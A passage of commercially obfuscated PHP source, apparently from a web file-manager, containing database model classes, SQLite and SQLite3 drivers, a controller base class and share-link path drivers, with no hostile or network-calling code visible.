(!is_array($ŞÁ•ìİ¤)) { $ŞÁ•ìİ¤ = array($ŞÁ•ìİ¤); } $ë ë¨¶ç = array($è‘ü÷µ´[420] => array($è‘ü÷µ´[7], $ŞÁ•ìİ¤)); $î‰Á¸É± = $this->field($è‘ü÷µ´[470])->where($ë ë¨¶ç)->select(); if ($î‰Á¸É±) { $this->where($ë ë¨¶ç)->delete(); $°ó‘Èê = array_to_keyvalue($î‰Á¸É±, $è‘ü÷µ´[12], $è‘ü÷µ´[469]); Model($è‘ü÷µ´[472])->remove($°ó‘Èê); } return !0; } public function setDetail($æ×Ñ»¢©, $¼²ÏÕ¾Û) { $şÚÜËæØ =& $_SERVER[Æ š¦İÈ]; return $this->where(array($şÚÜËæØ[422] => $æ×Ñ»¢©))->save(array($şÚÜËæØ[2045] => $¼²ÏÕ¾Û)); } public function rollbackToItem($Šìëñå, $†¿„òá) { $Á´«¤Û… =& $_SERVER[Æ š¦İÈ]; $ü‰Ã­“¯ = Model($Á´«¤Û…[822])->sourceInfo($Šìëñå); $this->addHistory($ü‰Ã­“¯, LNG($Á´«¤Û…[2056])); $²×ô…–£ = $this->find($†¿„òá); $òÖ‡åß = array($Á´«¤Û…[469] => $²×ô…–£[$Á´«¤Û…[469]], $Á´«¤Û…[80] => $²×ô…–£[$Á´«¤Û…[80]], $Á´«¤Û…[86] => time(), $Á´«¤Û…[456] => USER_ID); Model($Á´«¤Û…[822])->where(array($Á´«¤Û…[405] => $Šìëñå))->save($òÖ‡åß); return $this->where(array($Á´«¤Û…[422] => $†¿„òá))->delete(); } public function clearSame($·€ö±Ê) { $ª†®Î«¼ =& $_SERVER[Æ š¦İÈ]; $÷Å•”” = $this->listData($·€ö±Ê); $Ã ™Ñğ¿ = array_to_keyvalue_group($÷Å•””, $ª†®Î«¼[469]); $™®×ŸÜ÷ = array(); $Ó¿íÛ€‹ = array(); foreach ($Ã ™Ñğ¿ as $óĞùÆàŠ) { if (!$óĞùÆàŠ || count($óĞùÆàŠ) <= 1) { continue; } foreach ($óĞùÆàŠ as $ş°³Ì…) { $™®×ŸÜ÷[] = $ş°³Ì…[$ª†®Î«¼[469]]; $Ó¿íÛ€‹[] = $ş°³Ì…[$ª†®Î«¼[403]]; } } if (!$Ó¿íÛ€‹) { return; } $this->where(array($ª†®Î«¼[403] => array($ª†®Î«¼[7], $Ó¿íÛ€‹)))->delete(); Model($ª†®Î«¼[472])->remove($™®×ŸÜ÷); } public function userSpace() { $™¥­ÍáØ =& $_SERVER[Æ š¦İÈ]; $ÂÍË†ï“ = $this->tablePrefix; $ø¶£Ô·ˆ = array($™¥­ÍáØ[1635] => USER_ID); $‡å˜ş´ø = "{$ÂÍË†ï“}\x69\157\137\146\x69\154\145\40\146\x69\154\x65\163\40\157\x6e\40\x66\x69\154\145\163\56\146\151\154\x65\111\104\x20\x3d\x20\x68\x69\163\x74\x6f\162\171\x2e\146\151\x6c\x65\111\x44"; return $this->alias($™¥­ÍáØ[2054])->where($ø¶£Ô·ˆ)->join($‡å˜ş´ø, $™¥­ÍáØ[2055])->sum($™¥­ÍáØ[80]); } } goto Bñí­™ìĞ‹; FàŒÁÑÇä…: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\155\x5f\157\x70\x74\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\165", "\162\x6f\154\145", "\x72\x6f\x6c\145\x47\162\157\x75\160", "\162\145\x67\x69\x73\x74", "\145\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($éòøŒƒ®) { return "\123\171\x73\164\145\155\117\160\164\151\157\x6e\137{$éòøŒƒ®}"; } protected function optionDefault($¡™§Ó¨Ø = '') { $û´–¿Ê£ =& $_SERVER[Æ š¦İÈ]; if ($¡™§Ó¨Ø == $û´–¿Ê£[12]) { return $GLOBALS[$û´–¿Ê£[6]][$û´–¿Ê£[378]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\162\x6f\x6c\x65\114\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x61\x75\164\x68", "\x6c\x61\x62\x65\154", "\x64\151\x73\160\154\141\x79", "\x73\171\163\164\145\155", "\x64\x65\x73\x63", "\x69\147\156\157\x72\145\x45\x78\164", "\x69\147\156\x6f\x72\x65\x46\x69\154\145\123\151\x7a\145", "\x61\144\x6d\x69\x6e\151\163\x74\162\141\164\x6f\162", "\163\157\162\164"); public function listData($Æ¸ÍÈµ¥ = false, $Æ¥ÏîÀ“ = "\x73\157\x72\x74", $©ª¸øœê = false) { $®Ö„Î¯„ =& $_SERVER[Æ š¦İÈ]; $¿ÕÓçîÒ = parent::listData($Æ¸ÍÈµ¥, $Æ¥ÏîÀ“, $©ª¸øœê); if (!$Æ¸ÍÈµ¥) { foreach ($¿ÕÓçîÒ as $ÜŞöĞÈğ => $” ü¦ŠÃ) { if ($” ü¦ŠÃ[$®Ö„Î¯„[2005]] == 1) { $¿ÕÓçîÒ[$ÜŞöĞÈğ][$®Ö„Î¯„[453]] = LNG($®Ö„Î¯„[2234]); } } } return $¿ÕÓçîÒ; } public function update($«­­‡›ü, $õ­ªÉ¯§) { $ÈôÑº =& $_SERVER[Æ š¦İÈ]; $òñ† Ü = parent::listData($«­­‡›ü); $Î³°°ì™ = $this->findByName($õ­ªÉ¯§[$ÈôÑº[32]]); if (!$òñ† Ü || $Î³°°ì™ && $Î³°°ì™[$ÈôÑº[403]] != $òñ† Ü[$ÈôÑº[403]]) { return !1; } if ($Î³°°ì™[$ÈôÑº[2005]] == 1) { $õ­ªÉ¯§ = array($ÈôÑº[32] => $õ­ªÉ¯§[$ÈôÑº[32]], $ÈôÑº[1834] => $õ­ªÉ¯§[$ÈôÑº[1834]]); } $this->filterAuth($õ­ªÉ¯§[$ÈôÑº[416]]); return parent::update($«­­‡›ü, $õ­ªÉ¯§); } public function remove($ÈÑó™ˆÕ) { $ø¦Ø‡”¶ = parent::listData($ÈÑó™ˆÕ); if (!$ø¦Ø‡”¶ || $ø¦Ø‡”¶[$_SERVER[Æ š¦İÈ][1265]]) { return !1; } return parent::remove($ÈÑó™ˆÕ); } public function add($Øöšî«´) { $‹»À·´› =& $_SERVER[Æ š¦İÈ]; $ğœÑùŸ = $Øöšî«´[$‹»À·´›[32]]; if ($this->findByName($ğœÑùŸ)) { return !1; } $¦µíêô = array($‹»À·´›[423] => $ğœÑùŸ, $‹»À·´›[1818] => $‹»À·´›[12], $‹»À·´›[1814] => $‹»À·´›[1822], $‹»À·´›[2235] => 1, $‹»À·´›[1817] => 0, $‹»À·´›[2236] => 0, $‹»À·´›[1816] => $this->getSort()); $Øöšî«´ = array_merge($¦µíêô, $Øöšî«´); $this->filterAuth($Øöšî«´[$‹»À·´›[416]]); return parent::insert($Øöšî«´); } private function getSort() { $ê¢Êè¶É =& $_SERVER[Æ š¦İÈ]; $¯ÖÅ§Ã = parent::listData(); $ƒÊÄ„µ = array_to_keyvalue($¯ÖÅ§Ã, $ê¢Êè¶É[12], $ê¢Êè¶É[1835]); return empty($ƒÊÄ„µ) ? 0 : max($ƒÊÄ„µ) + 1; } private function filterAuth(&$Å©¾¤†‡) { $²Š½åŒ =& $_SERVER[Æ š¦İÈ]; $æÆ¶ªüÄ = array(); $¬ûâ˜ôö = array_filter(explode($²Š½åŒ[50], $Å©¾¤†‡)); foreach ($¬ûâ˜ôö as $Å©¾¤†‡) { $¸Ç–¦… = explode($²Š½åŒ[10], $Å©¾¤†‡); if ($¸Ç–¦…[0] == $²Š½åŒ[2237] && $¸Ç–¦…[1] != $²Š½åŒ[1184]) { $¡Ú¯ÌÙŸ = $¸Ç–¦…[0] . $²Š½åŒ[10] . $¸Ç–¦…[1] . $²Š½åŒ[2238]; if (!in_array($¡Ú¯ÌÙŸ, $¬ûâ˜ôö)) { $æÆ¶ªüÄ[] = $¡Ú¯ÌÙŸ; } } $æÆ¶ªüÄ[] = $Å©¾¤†‡; } $Å©¾¤†‡ = implode($²Š½åŒ[50], $æÆ¶ªüÄ); } public function sort($•Ùæˆ, $Ú¿ÆçæŒ) { return parent::update($•Ùæˆ, $Ú¿ÆçæŒ); } } goto cæÆ¾›ÄÍ; B²Åóã¼ò§: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $™ï†Êñœ =& $_SERVER[Æ š¦İÈ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$™ï†Êñœ[6]] =& $config; $this->values[$™ï†Êñœ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $™ï†Êñœ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‚ÏÜ­ÃÇ) { if (1 === func_num_args()) { $this->{$‚ÏÜ­ÃÇ} = new $‚ÏÜ­ÃÇ(); } else { $ßšØ¹‘– = new ReflectionClass($‚ÏÜ­ÃÇ); $®ò¤¢ğ€ = func_get_args(); array_shift($®ò¤¢ğ€); $this->{$‚ÏÜ­ÃÇ} = $ßšØ¹‘–->newInstanceArgs($®ò¤¢ğ€); } return $this->{$‚ÏÜ­ÃÇ}; } public function routeBind($Òïá½€‹, $™ÚïåÂ°, $ßÍ¾íÁÇ = 3) { $³õĞÇªß =& $_SERVER[Æ š¦İÈ]; $Şğé´Üİ = $this->in[$³õĞÇªß[9]]; $Òïá½€‹ = str_replace($³õĞÇªß[10], $³õĞÇªß[11], trim(trim($Òïá½€‹, $³õĞÇªß[8]), $³õĞÇªß[12])); if (!$Òïá½€‹ || count($Şğé´Üİ) <= $ßÍ¾íÁÇ) { return !1; } $ÄêÌ€„¿ = !0; $Œ¬È¥– = explode($³õĞÇªß[8], $Òïá½€‹); for ($öçÎñ¼ = 0; $öçÎñ¼ < count($Œ¬È¥–); $öçÎñ¼++) { if ($Œ¬È¥–[$öçÎñ¼] != $Şğé´Üİ[$ßÍ¾íÁÇ + $öçÎñ¼]) { $ÄêÌ€„¿ = !1; break; } } if (!$ÄêÌ€„¿) { return; } call_user_func_array(array($this, $™ÚïåÂ°), array()); } public function routeArgs($Ì×ÌöªÏ = 3) { $Õªï…Ô² = $this->in[$_SERVER[Æ š¦İÈ][9]]; if (count($Õªï…Ô²) <= $Ì×ÌöªÏ) { return array(); } $¥²ùÏ²¬ = array(); for ($ßˆ°×üÈ = $Ì×ÌöªÏ; $ßˆ°×üÈ < count($Õªï…Ô²); $ßˆ°×üÈ += 2) { $¥²ùÏ²¬[$Õªï…Ô²[$ßˆ°×üÈ]] = $Õªï…Ô²[$ßˆ°×üÈ + 1]; $this->in[$Õªï…Ô²[$ßˆ°×üÈ]] = $Õªï…Ô²[$ßˆ°×üÈ + 1]; } return $¥²ùÏ²¬; } protected function assign($ñ”­Ñ¼, $¹“¤€×Ş) { $this->values[$ñ”­Ñ¼] = $¹“¤€×Ş; } protected function display($ ËİÙ˜®) { ob_end_clean(); extract($this->values); require $this->tpl . $ ËİÙ˜®; } } class DbSqliteBase extends Db { public function __construct($ù´šîŸ = '') { $¦Ñ’›ıã =& $_SERVER[Æ š¦İÈ]; if (!extension_loaded($¦Ñ’›ıã[13])) { think_exception(think_lang($¦Ñ’›ıã[14]) . $¦Ñ’›ıã[15]); } if (!empty($ù´šîŸ)) { if (!isset($ù´šîŸ[$¦Ñ’›ıã[16]])) { $ù´šîŸ[$¦Ñ’›ıã[16]] = 438; } $this->config = $ù´šîŸ; if (empty($this->config[$¦Ñ’›ıã[17]])) { $this->config[$¦Ñ’›ıã[17]] = array(); } } } public function connect($­µ÷êÇé = '', $ó€û‹Üä = 0) { $‹Ã’ú¶Î =& $_SERVER[Æ š¦İÈ]; if (!isset($this->linkID[$ó€û‹Üä])) { if (empty($­µ÷êÇé)) { $­µ÷êÇé = $this->config; } $äŸîš¤¦ = !empty($­µ÷êÇé[$‹Ã’ú¶Î[17]][$‹Ã’ú¶Î[18]]) ? $­µ÷êÇé[$‹Ã’ú¶Î[17]][$‹Ã’ú¶Î[18]] : $this->pconnect; $ğ¼»Úó = $äŸîš¤¦ ? $‹Ã’ú¶Î[19] : $‹Ã’ú¶Î[20]; $this->linkID[$ó€û‹Üä] = $ğ¼»Úó($­µ÷êÇé[$‹Ã’ú¶Î[21]], $­µ÷êÇé[$‹Ã’ú¶Î[16]]); if (!$this->linkID[$ó€û‹Üä]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ó€û‹Üä], 30000); if (1 != think_config($‹Ã’ú¶Î[22])) { unset($this->config); } } return $this->linkID[$ó€û‹Üä]; } public function free() { $this->queryID = null; } public function query($·È²Â) { $«ÄğÉŒ =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $·È²Â; if ($this->queryID) { $this->free(); } think_action_status($«ÄğÉŒ[23], 1); think_status($«ÄğÉŒ[24]); $this->queryID = sqlite_query($this->_linkID, $·È²Â); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÌÁÃë‡ª = $this->getAll(); return $ÌÁÃë‡ª; } } public function execute($’¶„ä´ß) { $ÆÈ‹Èóı =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’¶„ä´ß; if ($this->queryID) { $this->free(); } think_action_status($ÆÈ‹Èóı[25], 1); think_status($ÆÈ‹Èóı[24]); $Ğúéëò = sqlite_exec($this->_linkID, $’¶„ä´ß); $this->debug(); if (!1 === $Ğúéëò) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Æ š¦İÈ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÓÃÎèıŞ = sqlite_query($this->_linkID, $_SERVER[Æ š¦İÈ][27]); if (!$ÓÃÎèıŞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $éĞš£á» = sqlite_query($this->_linkID, $_SERVER[Æ š¦İÈ][28]); if (!$éĞš£á») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $çæÌ¹Ë = array(); if ($this->numRows > 0) { for ($ĞŠ£Üä˜ = 0; $ĞŠ£Üä˜ < $this->numRows; $ĞŠ£Üä˜++) { $çæÌ¹Ë[$ĞŠ£Üä˜] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $çæÌ¹Ë; } public function getFields($ëì¼ÕÁ) { $º¯´ÆŞÕ =& $_SERVER[Æ š¦İÈ]; $Á‘¼¡ÚĞ = $this->query($º¯´ÆŞÕ[29] . $ëì¼ÕÁ . $º¯´ÆŞÕ[30]); $„ÏÖïÆ = array(); if ($Á‘¼¡ÚĞ) { foreach ($Á‘¼¡ÚĞ as $É¤Á¯¯ğ => $Ë°îÍ…) { $„ÏÖïÆ[$Ë°îÍ…[$º¯´ÆŞÕ[31]]] = array($º¯´ÆŞÕ[32] => $Ë°îÍ…[$º¯´ÆŞÕ[31]], $º¯´ÆŞÕ[33] => $Ë°îÍ…[$º¯´ÆŞÕ[34]], $º¯´ÆŞÕ[35] => (bool) ($Ë°îÍ…[$º¯´ÆŞÕ[36]] === $º¯´ÆŞÕ[12]), $º¯´ÆŞÕ[37] => $Ë°îÍ…[$º¯´ÆŞÕ[38]], $º¯´ÆŞÕ[39] => strtolower($Ë°îÍ…[$º¯´ÆŞÕ[40]]) == $º¯´ÆŞÕ[41], $º¯´ÆŞÕ[42] => strtolower($Ë°îÍ…[$º¯´ÆŞÕ[43]]) == $º¯´ÆŞÕ[44]); } } return $„ÏÖïÆ; } public function getTables($Œ‹Àøñ£ = '') { $Ö¶ºö²± =& $_SERVER[Æ š¦İÈ]; $ŠÎÓßÌ = $this->query($Ö¶ºö²±[45] . $Ö¶ºö²±[46] . $Ö¶ºö²±[47]); $§÷Ğ¬ × = array(); foreach ($ŠÎÓßÌ as $ë¹äÌÁ™ => $•Úä„ä) { $§÷Ğ¬ ×[$ë¹äÌÁ™] = current($•Úä„ä); } return $§÷Ğ¬ ×; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $õûù©›‹ =& $_SERVER[Æ š¦İÈ]; $å°î×…  = sqlite_last_error($this->_linkID); $this->error = $å°î×…  . $õûù©›‹[4] . sqlite_error_string($å°î×… ); if ($õûù©›‹[12] != $this->queryStr) { $this->error .= LNG($õûù©›‹[48]) . $this->queryStr; } think_trace($this->error, $õûù©›‹[12], $õûù©›‹[49]); return $this->error; } public function escapeString($×èÂçÃï) { return sqlite_escape_string($×èÂçÃï); } public function parseLimit($™ˆÏ‹É) { $ğêç¼Šú =& $_SERVER[Æ š¦İÈ]; $ıÇ¾ˆíñ = $ğêç¼Šú[12]; if (!empty($™ˆÏ‹É)) { $™ˆÏ‹É = explode($ğêç¼Šú[50], $™ˆÏ‹É); if (count($™ˆÏ‹É) > 1) { $ıÇ¾ˆíñ .= $ğêç¼Šú[51] . $™ˆÏ‹É[1] . $ğêç¼Šú[52] . $™ˆÏ‹É[0] . $ğêç¼Šú[53]; } else { $ıÇ¾ˆíñ .= $ğêç¼Šú[51] . $™ˆÏ‹É[0] . $ğêç¼Šú[53]; } } return $ıÇ¾ˆíñ; } } class DbSqlite3Base extends Db { public function __construct($ßçŒ½‚“ = '') { $Ğ’À¬÷ç =& $_SERVER[Æ š¦İÈ]; if (!class_exists($Ğ’À¬÷ç[54])) { think_exception(think_lang($Ğ’À¬÷ç[14]) . $Ğ’À¬÷ç[55]); } if (!empty($ßçŒ½‚“)) { if (!isset($ßçŒ½‚“[$Ğ’À¬÷ç[16]])) { $ßçŒ½‚“[$Ğ’À¬÷ç[16]] = 438; } $this->config = $ßçŒ½‚“; if (empty($this->config[$Ğ’À¬÷ç[17]])) { $this->config[$Ğ’À¬÷ç[17]] = array(); } } } public function connect($Ì÷°Ç×¢ = '', $Åßªˆßª = 0) { $îÁäı™ =& $_SERVER[Æ š¦İÈ]; if (!isset($this->linkID[$Åßªˆßª])) { if (empty($Ì÷°Ç×¢)) { $Ì÷°Ç×¢ = $this->config; } $this->linkID[$Åßªˆßª] = new SQLite3($Ì÷°Ç×¢[$îÁäı™[21]]); if (!$this->linkID[$Åßªˆßª]) { think_exception($this->linkID[$Åßªˆßª]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Åßªˆßª]->busyTimeout(30000); if (1 != think_config($îÁäı™[22])) { unset($this->config); } } return $this->linkID[$Åßªˆßª]; } public function free() { $this->queryID = null; } public function query($»ûÊ™µ·) { $ æ°é§† =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»ûÊ™µ·; if ($this->queryID) { $this->free(); } think_action_status($ æ°é§†[23], 1); think_status($ æ°é§†[24]); $this->queryID = $this->_linkID->query($»ûÊ™µ·); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÔïñÙï· = $this->getAll(); $this->numRows = count($ÔïñÙï·); return $ÔïñÙï·; } } public function execute($ä¸ÇÒ·ù) { $èÎ‹Óî =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ä¸ÇÒ·ù; if ($this->queryID) { $this->free(); } think_action_status($èÎ‹Óî[25], 1); think_status($èÎ‹Óî[24]); $í™œ‰€§ = $this->_linkID->exec($ä¸ÇÒ·ù); $this->debug(); if (!1 === $í™œ‰€§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Æ š¦İÈ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $”ƒÀ»Ó‰ = $this->_linkID->query($_SERVER[Æ š¦İÈ][27]); if (!$”ƒÀ»Ó‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹Š‡²˜ê = $this->_linkID->query($_SERVER[Æ š¦İÈ][28]); if (!$¹Š‡²˜ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $˜êî¹–ç = array(); while ($³À×îëğ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $˜êî¹–ç[] = $³À×îëğ; } $this->queryID->reset(); return $˜êî¹–ç; } public function getFields($ÒÇ¡ÒŸ) { $ Úâ™‰› =& $_SERVER[Æ š¦İÈ]; $ÜñşÄÊé = $this->query($ Úâ™‰›[29] . $ÒÇ¡ÒŸ . $ Úâ™‰›[30]); $æ‚ë”¿ñ = array(); if ($ÜñşÄÊé) { foreach ($ÜñşÄÊé as $˜¥öÀ => $›Ïı¿§Ü) { $æ‚ë”¿ñ[$›Ïı¿§Ü[$ Úâ™‰›[32]]] = array($ Úâ™‰›[32] => $›Ïı¿§Ü[$ Úâ™‰›[32]], $ Úâ™‰›[33] => $›Ïı¿§Ü[$ Úâ™‰›[33]], $ Úâ™‰›[35] => (bool) ($›Ïı¿§Ü[$ Úâ™‰›[35]] === $ Úâ™‰›[12]), $ Úâ™‰›[37] => $›Ïı¿§Ü[$ Úâ™‰›[56]], $ Úâ™‰›[39] => (bool) $›Ïı¿§Ü[$ Úâ™‰›[57]], $ Úâ™‰›[42] => (bool) $›Ïı¿§Ü[$ Úâ™‰›[57]]); } } return $æ‚ë”¿ñ; } public function getTables($ıöƒ®Ú = '') { $’³¼”ò =& $_SERVER[Æ š¦İÈ]; $±Õ„–‚ = $this->query($’³¼”ò[45] . $’³¼”ò[46] . $’³¼”ò[47]); $‰›ºóˆ¿ = array(); foreach ($±Õ„–‚ as $Ò˜•ïîÇ => $ã›îÏè‹) { $‰›ºóˆ¿[$Ò˜•ïîÇ] = current($ã›îÏè‹); } return $‰›ºóˆ¿; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ü©Æû— =& $_SERVER[Æ š¦İÈ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ü©Æû—[12] != $this->queryStr) { $this->error .= LNG($ü©Æû—[48]) . $this->queryStr; } think_trace($this->error, $ü©Æû—[12], $ü©Æû—[49]); return $this->error; } public function escapeString($ŸêË©Â‹) { $¹¶Şİáï =& $_SERVER[Æ š¦İÈ]; if ($this->_linkID) { return $this->_linkID->escapeString($ŸêË©Â‹); } return str_ireplace($¹¶Şİáï[58], $¹¶Şİáï[59], $ŸêË©Â‹); } public function parseLimit($¢ÙÄâë) { $˜ÃˆÄ›¶ =& $_SERVER[Æ š¦İÈ]; $¨Ÿ¢€¿« = $˜ÃˆÄ›¶[12]; if (!empty($¢ÙÄâë)) { $¢ÙÄâë = explode($˜ÃˆÄ›¶[50], $¢ÙÄâë); if (count($¢ÙÄâë) > 1) { $¨Ÿ¢€¿« .= $˜ÃˆÄ›¶[51] . $¢ÙÄâë[1] . $˜ÃˆÄ›¶[52] . $¢ÙÄâë[0] . $˜ÃˆÄ›¶[53]; } else { $¨Ÿ¢€¿« .= $˜ÃˆÄ›¶[51] . $¢ÙÄâë[0] . $˜ÃˆÄ›¶[53]; } } return $¨Ÿ¢€¿«; } } goto BâÉ†ğ¤¥Ñ; d’êµÂÍ•±: class PathDriverDbShareLink extends PathDriverDB { public function __construct($¢˜ÄØİŸ) { $this->pathParse = $¢˜ÄØİŸ; $this->model = Model($_SERVER[Æ š¦İÈ][1316]); } protected function infoParse($Ô—Å„, $Œ“ùŞÒ = false, $æ‘¼Ñ·Š = false) { $êñôã¶ =& $_SERVER[Æ š¦İÈ]; return Action($êñôã¶[1164])->sharePathInfo($this->pathParse[$êñôã¶[78]], !0, $Œ“ùŞÒ); } public function listPath($éÉÏÕôÜ, $çê©³§© = false) { $ù—“³€ =& $_SERVER[Æ š¦İÈ]; $Ï›†Üğ = parent::listPath($éÉÏÕôÜ, $çê©³§©); if (!$Ï›†Üğ) { return $Ï›†Üğ; } if (is_array($Ï›†Üğ[$ù—“³€[1325]])) { $Ï›†Üğ[$ù—“³€[1325]] = Action($ù—“³€[1164])->shareItemInfo($Ï›†Üğ[$ù—“³€[1325]]); } foreach ($Ï›†Üğ as $Î¬Çâß => $…õ™Ğíø) { if (!in_array($Î¬Çâß, array($ù—“³€[76], $ù—“³€[77]))) { continue; } foreach ($…õ™Ğíø as $ø¹ó¯Øî => $•÷‘×›…) { $Ï›†Üğ[$Î¬Çâß][$ø¹ó¯Øî] = Action($ù—“³€[1164])->shareItemInfo($•÷‘×›…); } } return $Ï›†Üğ; } public function listAll($ĞÍùôí) { $¸¼ìì¾™ =& $_SERVER[Æ š¦İÈ]; $³Ë¿ƒ¬Ï = IO::info($this->pathParse[$¸¼ìì¾™[78]]); if (!$³Ë¿ƒ¬Ï) { return array(); } $¸½½Åñ¶ = $this->model->listAll($ĞÍùôí); foreach ($¸½½Åñ¶ as &$Ğ˜„’„ ) { $Ğ˜„’„ [$¸¼ìì¾™[87]] = Action($¸¼ìì¾™[1164])->shareItemInfo($Ğ˜„’„ [$¸¼ìì¾™[87]]); } unset($Ğ˜„’„ ); return $¸½½Åñ¶; } } class PathDriverDriverShareItem { public function __construct($´òˆ‰ã) { $this->pathParse = $´òˆ‰ã; } public function __call($ßõ›ç™Ä, $ŞˆŒÓ–Î) { $æ›ª†¸¹ =& $_SERVER[Æ š¦İÈ]; if (method_exists($this, $ßõ›ç™Ä)) { return; } $Ç±ù¨œ¸ = call_user_func_array(array($æ›ª†¸¹[1326], $ßõ›ç™Ä), $ŞˆŒÓ–Î); $†”©«Ëú = array($æ›ª†¸¹[1327], $æ›ª†¸¹[1328], $æ›ª†¸¹[1329], $æ›ª†¸¹[1330], $æ›ª†¸¹[551], $æ›ª†¸¹[553], $æ›ª†¸¹[1331], $æ›ª†¸¹[108], $æ›ª†¸¹[1332], $æ›ª†¸¹[1333]); if (in_array($ßõ›ç™Ä, $†”©«Ëú)) { $Ç±ù¨œ¸ = $this->getPathOuter($Ç±ù¨œ¸); } return $Ç±ù¨œ¸; } public function copy($·°çôòî, $ÒÍ®›İ, $Ü‡œËªÖ = false, $Ø“Ãß¹ = false) { return $this->copyMove($·°çôòî, $ÒÍ®›İ, $Ü‡œËªÖ, $_SERVER[Æ š¦İÈ][551], $Ø“Ãß¹); } public function move($šÀ¥šîŒ, $¥ïª™­œ, $óéá®ÛŒ = false, $€õ×Æ‚Ø = false) { return $this->copyMove($šÀ¥šîŒ, $¥ïª™­œ, $óéá®ÛŒ, $_SERVER[Æ š¦İÈ][553], $€õ×Æ‚Ø); } private function copyMove($Öïãèêà, $Å–ú„Ñˆ, $ ÉÉô¯Ô, $Ûè‰´ÜĞ, $í–Ñ…ó± = false) { $’ê˜Ç‰º =& $_SERVER[Æ š¦İÈ]; $”œ¦úÃî = $Å–ú„Ñˆ; $ï½ù’ò“ = IO::driverMake($Å–ú„Ñˆ); if ($ï½ù’ò“->pathParse[$’ê˜Ç‰º[1142]]) { $Å–ú„Ñˆ = $ï½ù’ò“->pathParse[$’ê˜Ç‰º[1142]]; } else { $Å–ú„Ñˆ = $”œ¦úÃî; } $Ùà™”â = IO::copyMove($Öïãèêà, $Å–ú„Ñˆ, $ ÉÉô¯Ô, $Ûè‰´ÜĞ, $í–Ñ…ó±); $Ùà™”â = $this->getPathOuter($Ùà™”â); return $Ùà™”â; } public function pathThis($äı•ˆôÏ) { return get_path_this($this->pathParse[$_SERVER[Æ š¦İÈ][78]]); } public function pathFather($¥ÊêíÚ·) { return get_path_father($this->pathParse[$_SERVER[Æ š¦İÈ][78]]); } public function iconvSystem($ÃˆÂ¾˜Ì) { return $ÃˆÂ¾˜Ì; } protected function infoParse($ÌŸÌˆ, $„ÌıÎ¥Ü = false) { $äŠ“ˆ¤ =& $_SERVER[Æ š¦İÈ]; $‹¤íÆ¹ = $this->pathParse[$äŠ“ˆ¤[488]][$äŠ“ˆ¤[1165]] . $this->pathParse[$äŠ“ˆ¤[1158]]; if ($„ÌıÎ¥Ü) { $Ö¬ùÕ¨º = IO::infoWithChildren($‹¤íÆ¹); } else { $Ö¬ùÕ¨º = IO::info($‹¤íÆ¹); } $­Â–Ğ„ = $this->pathParse[$äŠ“ˆ¤[488]]; return Action($äŠ“ˆ¤[1324])->_shareItemeParse($Ö¬ùÕ¨º, $­Â–Ğ„); } public function listAll($‰¥å¢Ù) { $ÃĞÀ°‘ =& $_SERVER[Æ š¦İÈ]; $ôæƒğÆ = IO::listAll($‰¥å¢Ù); $÷ƒõåûç = $this->pathParse[$ÃĞÀ°‘[488]]; foreach ($ôæƒğÆ as &$Èïïã ) { check_abort(); $öåõÌ» = IO::info($Èïïã [$ÃĞÀ°‘[78]]); $öåõÌ» = is_array($öåõÌ») ? $öåõÌ» : array(); $Èïïã  = array_merge($öåõÌ», $Èïïã ); $Èïïã [$ÃĞÀ°‘[87]] = Action($ÃĞÀ°‘[1324])->_shareItemeParse($Èïïã , $÷ƒõåûç); } unset($Èïïã ); return $ôæƒğÆ; } public function getPathOuter($á³àÙÀì) { $éî’Åø =& $_SERVER[Æ š¦İÈ]; $ı§àä’ = KodIO::parse($á³àÙÀì); if ($ı§àä’[$éî’Åø[33]] == KodIO::KOD_SHARE_ITEM) { return $ı§àä’[$éî’Åø[78]]; } $³Úëğ¤º = KodIO::clear($á³àÙÀì); $Í¼¡õ€´ = KodIO::clear($this->pathParse[$éî’Åø[488]][$éî’Åø[1165]]); 